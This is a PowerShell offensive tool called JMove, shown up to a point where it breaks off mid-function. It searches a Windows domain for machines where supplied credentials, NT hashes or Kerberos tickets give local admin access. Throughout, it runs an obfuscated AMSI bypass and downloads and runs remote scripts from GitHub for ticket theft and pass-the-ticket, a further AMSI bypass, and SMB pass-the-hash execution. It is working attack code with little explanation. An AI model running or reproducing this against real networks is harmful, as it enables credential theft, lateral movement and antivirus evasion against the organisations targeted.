<#
.SYNOPSIS
JMove - Author: Rob LP (@L3o4j)

.DESCRIPTION
1. Search for local admin access on machines in a domain or local network
2. Check for active sessions on those machines where you have admin access
3. Dump hashes and tickets
#>

function Find-WMILocalAdminAccess
{
	[CmdletBinding()] Param(

		[Parameter (Mandatory=$False, Position = 0, ValueFromPipeline=$true)]
		[String]
		$ComputerName,

		[Parameter (Mandatory=$False, Position = 1, ValueFromPipeline=$true)]
		[String[]]
		$ComputerFile,
		
		[Parameter (Mandatory=$False, Position = 2, ValueFromPipeline=$true)]
		[String]
		$Username,
		
		[Parameter (Mandatory=$False, Position = 3, ValueFromPipeline=$true)]
		[String]
		$Password,
		
		[Parameter (Mandatory=$False, Position = 4, ValueFromPipeline=$true)]
		[String]
		$HASHorPassword,
		
		[Parameter (Mandatory=$False, Position = 5, ValueFromPipeline=$true)]
		[String]
		$currentuserpassword
		
	)
	$ErrorActionPreference = "SilentlyContinue"
	#read word list (consider pipeline for performance)
	if ($Computerfile)
	{
		$Computers = $Computerfile
	}
	elseif ($ComputerName)
	{
		$Computers = $ComputerName
	}
	else
	{
		# Get a list of all the computers in the domain
		$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
		$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry
		$objSearcher.Filter = "(&(sAMAccountType=805306369))"
		$Computers = $objSearcher.FindAll() | %{$_.properties.dnshostname}

	}
	
	$jcurrentdomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }
	
	# Remove current host
	$Computers = $Computers | Where-Object {-not ($_ -cmatch "$env:computername")}
	$Computers = $Computers | Where-Object {-not ($_ -match "$env:computername")}
	$Computers = $Computers | Where-Object {$_ -ne "$env:computername"}
	$Computers = $Computers | Where-Object {$_ -ne "$env:computername.$jcurrentdomain"}
	
	if($Username){
		Write-Host "$Username has Local Admin access on:" -ForegroundColor Yellow
	}
	
	else{
		Write-Host "The current user has Local Admin access on:" -ForegroundColor Yellow
	}
	
	# Test Connection - Port 135
	
	$reachable_hosts = $null
	$Tasks = $null
	$total = $Computers.Count
	$count = 0

	$Tasks = $Computers | % {
		Write-Progress -Activity "Scanning Ports" -Status "$count out of $total hosts scanned" -PercentComplete ($count / $total * 100)
		$tcpClient = New-Object System.Net.Sockets.TcpClient
		$asyncResult = $tcpClient.BeginConnect($_, 135, $null, $null)
		$wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
		if($wait) {
			$tcpClient.EndConnect($asyncResult)
			$tcpClient.Close()
			$reachable_hosts += ($_ + "`n")
		} else {}
		$count++
	}

	Write-Progress -Activity "Checking Hosts..." -Completed

	$reachable_hosts = ($reachable_hosts | Out-String) -split "`n"
	
	if([String]::IsNullOrWhiteSpace(($reachable_hosts)) -eq "True"){
		Write-Host "No Hosts Alive.."
		Write-Host ""

		if($Username){
			if(($HASHorPassword) -eq "Password"){
				if($Username.Contains(".\")){}
				else{
					klist purge > $null
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
					Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
				}
			}
			if(($HASHorPassword) -eq "HASH"){
				if($Username.Contains(".\")){}
				else{
					klist purge > $null
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
					Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
				}
			}
			if(($HASHorPassword) -eq "Ticket"){
				klist purge > $null
				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
				Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
			}
			else{}
		}
		else{}
		break
	}
	
	$WMIAdminAccess = $null
	
	$total = $reachable_hosts.Count
	$count = 0
	
	foreach ($Computer in $reachable_hosts)
	{
	
		Write-Progress -Activity "Testing Access" -Status "$count out of $total hosts tested" -PercentComplete ($count / $total * 100)
			
		#clear error listing
		$Error.clear()
	
		#run the test
		if(($Username.Contains(".\")) -AND ($HASHorPassword) -eq "Password"){
			
			$SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force

			$cred = New-Object System.Management.Automation.PSCredential($Username,$SecPassword)
			
			Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -ErrorAction SilentlyContinue -Credential $cred > $null
		}
		
		else{
			Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -ErrorAction SilentlyContinue > $null
		}
		
		#put the first error into a variable (best practice)
		$ourerror = $error[0]
		
		# if there is no error, then we were successfull, else, was it a username or password error? if it wasn't username/password incorrect, something else is wrong so break the look
		if (($ourerror) -eq $null)
		{	
			$Computer.Replace(".$jcurrentdomain","")
			$WMIAdminAccess += ($Computer + "`n")
		}
		
		$count++

	}
	
	Write-Progress -Activity "Testing Access" -Completed
	
	if([String]::IsNullOrWhiteSpace(($WMIAdminAccess)) -eq "True"){
		Write-Host "No Access"
		Write-Host ""
		
		if($Username){
			if(($HASHorPassword) -eq "Password"){
				if($Username.Contains(".\")){}
				else{
					klist purge > $null
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
					Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
				}
			}
			if(($HASHorPassword) -eq "HASH"){
				if($Username.Contains(".\")){}
				else{
					klist purge > $null
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
					Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
				}
			}
			if(($HASHorPassword) -eq "Ticket"){
				klist purge > $null
				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
				Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
			}
			else{}
		}
		else{}
		break
	}
	
	else{
		$global:WMIAdminAccess = $WMIAdminAccess
		}

}

$ErrorActionPreference = "SilentlyContinue"
$WarningPreference = "SilentlyContinue"
Set-Variable MaximumHistoryCount 32767

S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

$jcurrentdomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }

Write-Host ""
Write-Host "####################################"
Write-Host "# " -NoNewline;
Write-Host "JMove" -ForegroundColor Red -NoNewline;
Write-Host " | " -NoNewline;
Write-Host "Abuse Local Admin Access" -ForegroundColor Yellow -NoNewline;
Write-Host " #"
Write-Host "####################################"
Write-Host ""

Write-Host "Targets:" -ForegroundColor Yellow -NoNewline;
Write-Host " (" -NoNewline;
Write-Host "Servers" -ForegroundColor Yellow -NoNewline;
Write-Host " or " -NoNewline;
Write-Host "Workstations" -ForegroundColor Yellow -NoNewline;
Write-Host " or " -NoNewline;
Write-Host "Absolute File-Path" -ForegroundColor Yellow -NoNewline;
Write-Host " or " -NoNewline;
Write-Host "-ComputerName Server01" -ForegroundColor Yellow -NoNewline;
Write-Host " or leave blank for " -NoNewline;
Write-Host "All" -ForegroundColor Yellow -NoNewline;
Write-Host ")";
$TargetsPath = Read-Host

Write-Host ""
Write-Host "Username:" -ForegroundColor Yellow -NoNewline;
Write-Host " (" -NoNewline;
Write-Host "Domain\Username" -ForegroundColor Yellow -NoNewline;
Write-Host " or " -NoNewline;
Write-Host ".\Username" -ForegroundColor Yellow -NoNewline;
Write-Host " or leave blank for " -NoNewline;
Write-Host "Current User"  -ForegroundColor Yellow -NoNewline;
Write-Host ")";
$Username = Read-Host
Write-Host ""

if($Username){
	if($Username.Contains(".\")){
		Write-Host "Are you passing a " -NoNewline;
		Write-Host "Password"  -ForegroundColor Yellow -NoNewline;
		Write-Host " or a "-NoNewline;
		Write-Host "HASH"  -ForegroundColor Yellow -NoNewline;
		Write-Host " ?";
		$HASHorPassword = Read-Host
	}
	else{
		Write-Host "Are you passing a " -NoNewline;
		Write-Host "Password"  -ForegroundColor Yellow -NoNewline;
		Write-Host ", a "-NoNewline;
		Write-Host "HASH"  -ForegroundColor Yellow -NoNewline;
		Write-Host " or a "-NoNewline;
		Write-Host "Ticket"  -ForegroundColor Yellow -NoNewline;
		Write-Host " ?";
		$HASHorPassword = Read-Host
	}
	
	if($HASHorPassword -eq "Password"){
		Write-Host ""
		Write-Host "Password: " -ForegroundColor Yellow -NoNewline;
		$Password = Read-Host
		
		Write-Host ""
		
		if($Username.Contains(".\")){
			
			if($TargetsPath.Contains("-ComputerName")){
				$TargetsPath = $TargetsPath.Replace("-ComputerName ","")
				Find-WMILocalAdminAccess -ComputerName $TargetsPath -Username $Username -Password $Password -HASHorPassword $HASHorPassword
			}
			
			elseif($TargetsPath -eq "Servers"){
				$PwshModule = (Get-Module)
				if($PwshModule -Like "*dynamic*code*module*Microsoft*"){
					$Servers = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -like "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $Servers -Username $Username -Password $Password -HASHorPassword $HASHorPassword
				}
				else{
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
					Import-ActiveDirectory
					$Servers = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -like "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $Servers -Username $Username -Password $Password -HASHorPassword $HASHorPassword
				}
			}
			
			elseif($TargetsPath -eq "Workstations"){
				$PwshModule = (Get-Module)
				if($PwshModule -Like "*dynamic*code*module*Microsoft*"){
					$Workstations = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -notlike "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $Workstations -Username $Username -Password $Password -HASHorPassword $HASHorPassword
				}
				else{
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
					Import-ActiveDirectory
					$Workstations = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -notlike "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $Workstations -Username $Username -Password $Password -HASHorPassword $HASHorPassword
				}
			}
			
			elseif($TargetsPath){
				$UserTargets = (Get-Content -Path $TargetsPath)
				Find-WMILocalAdminAccess -ComputerFile $UserTargets -Username $Username -Password $Password -HASHorPassword $HASHorPassword
			}
			
			else{
				$PwshModule = (Get-Module)
				if($PwshModule -Like "*dynamic*code*module*Microsoft*"){
					$AllADObjects = (Get-ADComputer -Filter {enabled -eq "true"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $AllADObjects -Username $Username -Password $Password -HASHorPassword $HASHorPassword
				}
				else{
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
					Import-ActiveDirectory
					$AllADObjects = (Get-ADComputer -Filter {enabled -eq "true"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $AllADObjects -Username $Username -Password $Password -HASHorPassword $HASHorPassword
				}
			}
			
		}
		
		else{
			
			Write-Host "Domain is set to: " -ForegroundColor Cyan -NoNewline; Write-Host "$jcurrentdomain" -ForegroundColor Yellow
			Write-Host "Do you want to specify a different domain for the User to impersonate ?"
			Write-Host "(Leave blank for " -NoNewline;
			Write-Host "$jcurrentdomain" -ForegroundColor Yellow -NoNewline;
			Write-Host " or provide " -NoNewline;
			Write-Host "FQDN" -ForegroundColor Yellow -NoNewline;
			Write-Host ")"
			$jtargetdomain = Read-Host
			
			Write-Host ""
			
			# Request ticket and import, then continue script
			
			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null

			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
			
			$CurrentUserTicket = Invoke-Ribes -Command "tgtdeleg /nowrap" | Out-String
			$OriginalUserTicket = $CurrentUserTicket.Substring($CurrentUserTicket.IndexOf('doI'))
			$OriginalUserTicket = $OriginalUserTicket.Trim()
			$currentuserpassword = $OriginalUserTicket

			$RubUsername = $Username.Split("\")[1].Trim()

			klist purge > $null
			
			if($jtargetdomain){
				Invoke-Ribes -Command "asktgt /user:$RubUsername /domain:$jtargetdomain /password:$Password /ptt" > $null
			}
			
			else{
				Invoke-Ribes -Command "asktgt /user:$RubUsername /domain:$jcurrentdomain /password:$Password /ptt" > $null
			}
			
			if($TargetsPath.Contains("-ComputerName")){
				$TargetsPath = $TargetsPath.Replace("-ComputerName ","")
				Find-WMILocalAdminAccess -ComputerName $TargetsPath -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
			}
			
			elseif($TargetsPath -eq "Servers"){
				$PwshModule = (Get-Module)
				if($PwshModule -Like "*dynamic*code*module*Microsoft*"){
					$Servers = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -like "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $Servers -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
				}
				else{
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
					Import-ActiveDirectory
					$Servers = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -like "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $Servers -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
				}
			}
			
			elseif($TargetsPath -eq "Workstations"){
				$PwshModule = (Get-Module)
				if($PwshModule -Like "*dynamic*code*module*Microsoft*"){
					$Workstations = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -notlike "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $Workstations -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
				}
				else{
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
					Import-ActiveDirectory
					$Workstations = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -notlike "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $Workstations -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
				}
			}
			
			elseif($TargetsPath){
				$UserTargets = (Get-Content -Path $TargetsPath)
				Find-WMILocalAdminAccess -ComputerFile $UserTargets -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
			}
			
			else{
				$PwshModule = (Get-Module)
				if($PwshModule -Like "*dynamic*code*module*Microsoft*"){
					$AllADObjects = (Get-ADComputer -Filter {enabled -eq "true"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $AllADObjects -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
				}
				else{
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
					Import-ActiveDirectory
					$AllADObjects = (Get-ADComputer -Filter {enabled -eq "true"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
					Find-WMILocalAdminAccess -ComputerFile $AllADObjects -Username $Username -HASHorPassword $HASHorPassword -currentuserpassword $currentuserpassword
				}
			}
			
		}
		
		Write-Host ""
		
	}
	
	elseif($HASHorPassword -eq "HASH"){
		if($Username.Contains(".\")){
			Write-Host ""
			Write-Host "NT Hash: "  -ForegroundColor Yellow -NoNewline;
			$DomainHASH = Read-Host
		}
		else{
			Write-Host ""
			Write-Host "NT Hash"  -ForegroundColor Yellow -NoNewline;
			Write-Host " or " -NoNewline;
			Write-Host "AES256: "  -ForegroundColor Yellow -NoNewline;
			$DomainHASH = Read-Host
		}
		
		Write-Host ""
		
		if($Username.Contains(".\")){
			
			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Exc.ps1')
			
			$SMBExecUsername = $Username.Split("\")[1].Trim()
			
			if($TargetsPath.Contains("-ComputerName")){
				Write-Host "$SMBExecUsername has Local Admin access on:" -ForegroundColor Yellow
				
				$SMBTargetsPath = $TargetsPath.Replace("-ComputerName ","")
				$WMIAdminAccess = $null
				
				$reachable_hosts = $null
				$Tasks = $null
				$total = $SMBTargetsPath.Count
				$count = 0

				$Tasks = $SMBTargetsPath | % {
					Write-Progress -Activity "Scanning Ports" -Status "$count out of $total hosts scanned" -PercentComplete ($count / $total * 100)
					$tcpClient = New-Object System.Net.Sockets.TcpClient
					$asyncResult = $tcpClient.BeginConnect($_, 135, $null, $null)
					$wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
					if($wait) {
						$tcpClient.EndConnect($asyncResult)
						$tcpClient.Close()
						$reachable_hosts = $_
					} else {}
					$count++
				}

				Write-Progress -Activity "Checking Hosts..." -Completed

				$SMBTargetsPath = $reachable_hosts
				
				if($SMBTargetsPath){
					$SMBAdminAccessOn = Invoke-Exc -Target $SMBTargetsPath -Username $SMBExecUsername -Hash $DomainHASH
				}
				
				else{
					Write-Host "No Hosts Alive.."
					Write-Host ""
					break
				}
				
				if($SMBAdminAccessOn -Like "* failed to authenticate on *"){
					Write-Host "No Access"
					Write-Host ""
					break
				}
				elseif($SMBAdminAccessOn -Like "* has Service Control Manager write privilege on *"){
					$WMIAdminAccess = $SMBTargetsPath
					$WMIAdminAccess.Replace(".$jcurrentdomain","")
				}
				else{
					Write-Host ""
					Write-Host "Some error.. Please check you entered the correct info (e.g.: -ComputerName is CaseSensitive)"
					break
				}
			
			}
			
			elseif($TargetsPath -eq "Servers"){
				Write-Host "$SMBExecUsername has Local Admin access on:" -ForegroundColor Yellow
				$PwshModule = (Get-Module)
				if($PwshModule -Like "*dynamic*code*module*Microsoft*"){}
				else{
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
					Import-ActiveDirectory
				}
				$ServersEnabled = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -like "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
				$ServersEnabled = $ServersEnabled | Where-Object {-not ($_ -cmatch "$env:computername")}
				$ServersEnabled = $ServersEnabled | Where-Object {-not ($_ -match "$env:computername")}
				$ServersEnabled = $ServersEnabled | Where-Object {$_ -ne "$env:computername"}
				$ServersEnabled = $ServersEnabled | Where-Object {$_ -ne "$env:computername.$jcurrentdomain"}
				
				# test connection

				$reachable_hosts = $null
				$Tasks = $null
				$total = $ServersEnabled.Count
				$count = 0

				$Tasks = $ServersEnabled | % {
					Write-Progress -Activity "Scanning Ports" -Status "$count out of $total hosts scanned" -PercentComplete ($count / $total * 100)
					$tcpClient = New-Object System.Net.Sockets.TcpClient
					$asyncResult = $tcpClient.BeginConnect($_, 135, $null, $null)
					$wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
					if($wait) {
						$tcpClient.EndConnect($asyncResult)
						$tcpClient.Close()
						$reachable_hosts += ($_ + "`n")
					} else {}
					$count++
				}

				Write-Progress -Activity "Checking Hosts..." -Completed

				$reachable_hosts = ($reachable_hosts | Out-String) -split "`n"
				
				if([String]::IsNullOrWhiteSpace(($reachable_hosts)) -eq "True"){
					Write-Host "No Hosts Alive.."
					Write-Host ""
					break
				}
				
				else{
					$SMBServers = $reachable_hosts
					$SMBServers = ($SMBServers | Out-String) -split "`n"
					$SMBServers = $SMBServers.Trim()
					$SMBServers = $SMBServers | Where-Object { $_ -ne "" }
				}

				# forloop

				$WMIAdminAccess = $null
				
				$serverjobs = $SMBServers | ForEach-Object {
					Start-Job -ScriptBlock {
						param($pwd, $SMBExecUsername, $DomainHASH, $SMBServer)
						S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
						iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Exc.ps1')
						$SMBAdminAccessOn = Invoke-Exc -Target $SMBServer -Username $SMBExecUsername -Hash $DomainHASH
						if($SMBAdminAccessOn -Like "* failed to authenticate on *"){}
						elseif($SMBAdminAccessOn -Like "* has Service Control Manager write privilege on *"){
							Write-Output "$SMBServer"
						}
						else{
							Write-Host ""
							Write-Host "Some error.. Please check you entered the correct info"
						}
					} -ArgumentList $pwd, $SMBExecUsername, $DomainHASH, $_
				}

				Wait-Job $serverjobs > $null
				
				# Retrieve the IPs
				$WMIAdminAccess = Receive-Job $serverjobs

				# Remove the jobs
				Remove-Job $serverjobs

				if([String]::IsNullOrWhiteSpace(($WMIAdminAccess)) -eq "True"){
					Write-Host "No Access"
					Write-Host ""
					break
				}
				else{
					$WMIAdminAccess.Replace(".$jcurrentdomain","")
				}
				
			}
			
			elseif($TargetsPath -eq "Workstations"){
				Write-Host "$SMBExecUsername has Local Admin access on:" -ForegroundColor Yellow
				$PwshModule = (Get-Module)
				if($PwshModule -Like "*dynamic*code*module*Microsoft*"){}
				else{
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
					Import-ActiveDirectory
				}
				
				$WorkstationsEnabled = (Get-ADComputer -Filter {enabled -eq "true" -and OperatingSystem -notlike "*windows*server*"} -Properties * | sort DNSHostname | Select-Object -ExpandProperty DNSHostname)
				$WorkstationsEnabled = $WorkstationsEnabled | Where-Object {-not ($_ -cmatch "$env:computername")}
				$WorkstationsEnabled = $WorkstationsEnabled | Where-Object {-not ($_ -match "$env:computername")}
				$WorkstationsEnabled = $WorkstationsEnabled | Where-Object {$_ -ne "$env:computername"}
				$WorkstationsEnabled = $WorkstationsEnabled | Where-Object {$_ -ne "$env:computername.$jcurrentdomain"}
				
				# test connection
				
				$reachable_hosts = $null
				$Tasks = $null
				$total = $WorkstationsEnabled.Count
				$count = 0

				$Tasks = $WorkstationsEnabled | % {
					Write-Progress -Activity "Scanning Ports" -Status "$count out of $total hosts scanned" -PercentComplete ($count / $total * 100)
					$tcpClient = New-Object System.Net.Sockets.TcpClient
					$asyncResult = $tcpClient.BeginConnect($_, 135, $null, $null)
					$wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
					if($wait) {
						$tcpClient.EndConnect($asyncResult)
						$tcpClient.Close()
						$reachable_hosts += ($_ + "`n")
					} else {}
					$count++
				}

				Write-Progress -Activity "Checking Hosts..." -Completed

				$reachable_hosts = ($reachable_hosts | Out-String) -split "`n"
				
				# forloop
				
				if([String]::IsNullOrWhiteSpace(($reachable_hosts)) -eq "True"){
					Write-Host "No Hosts Alive.."
					Write-Host ""
					break
				}
				
				else{
					$SMBWorkstations = $reachable_hosts
					$SMBWorkstations = ($SMBWorkstations | Out-String) -split "`n"
					$SMBWorkstations = $SMBWorkstations.Trim()
					$SMBWorkstations = $SMBWorkstations | Where-Object { $_ -ne "" }
				}
				
				$WMIAdminAccess = $null
				
				$workstationjobs = $SMBWorkstations | ForEach-Object {
					Start-Job -ScriptBlock {
						param($pwd, $SMBExecUsername, $DomainHASH, $SMBWorkstation)
						S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
						iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Exc.ps1')
						$SMBAdminAccessOn = Invoke-Exc -Target $SMBWorkstation -Username $SMBExecUsername -Hash $DomainHASH
						if($SMBAdminAccessOn -Like "* failed to authenticate on *"){}
						elseif($SMBAdminAccessOn -Like "* has Service Control Manager write privilege on *"){
							Write-Output "$SMBWorkstation"
						}
						else{
							Write-Host ""
							Write-Host "Some error.. Please check you entered the correct info"
						}
					} -ArgumentList $pwd, $SMBExecUsername, $DomainHASH, $_
				}

				Wait-Job $workstationjobs > $null
				
				# Retrieve the IPs
				$WMIAdminAccess = Receive-Job $workstationjobs

				# Remove the jobs
				Remove-Job $workstationjobs

				if([String]::IsNullOrWhiteSpace(($WMIAdminAccess)) -eq "True"){
					Write-Host "No Access"
					Write-Host ""
					break
				}
				else{
					$WMIAdminAccess.Replace(".$jcurrentdomain","")
				}
				
			}
			
			elseif($TargetsPath){
				
				Write-Host "$SMBExecUsername has Local Admin access on:" -ForegroundColor Yellow
				
				# test connection
				
				$targetlist = (Get-Content -Path $TargetsPath)
				$targetlist = $targetlist | Where-Object {-not ($_ -cmatch "$env:computername")}
				$targetlist = $targetlist | Where-Object {-not ($_ -match "$env:computername")}
				$targetlist = $targetlist | Where-Object {$_ -ne "$env:computername"}
				$targetlist = $targetlist | Where-Object {$_ -ne "$env:computername.$jcurrentdomain"}

				$reachable_hosts = $null
				$Tasks = $null
				$total = $targetlist.Count
				$count = 0

				$Tasks = $targetlist | % {
					Write-Progress -Activity "Scanning Ports" -Status "$count out of $total hosts scanned" -PercentComplete ($count / $total * 100)
					$tcpClient = New-Object System.Net.Sockets.TcpClient
					$asyncResult = $tcpClient.BeginConnect($_, 135, $null, $null)
					$wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
					if($wait) {
						$tcpClient.EndConnect($asyncResult)
						$tcpClient.Close()
						$reachable_hosts += ($_ + "`n")
					} else {}
					$count++
				}

				Write-Progress -Activity "Checking Hosts..." -Completed

				$reachable_hosts = ($reachable_hosts | Out-String) -split "`n"
				
				if([String]::IsNullOrWhiteSpace(($reachable_hosts)) -eq "True"){
					Write-Host "No Hosts Alive.."
					Write-Host ""
					break
				}
				
				else{
					$SMBComputers = $reachable_hosts
					$SMBComputers = ($SMBComputers | Out-String) -split "`n"
					$SMBComputers = $SMBComputers.Trim()
					$SMBComputers = $SMBComputers | Where-Object { $_ -ne "" }
				}
				
				# forloop
				
				$WMIAdminAccessIPs = $null
				$WMIAdminAccess = $null
				
				$computerpathjobs = $SMBComputers | ForEach-Object {
					Start-Job -ScriptBlock {
						param($pwd, $SMBExecUsername, $DomainHASH, $SMBComputer)
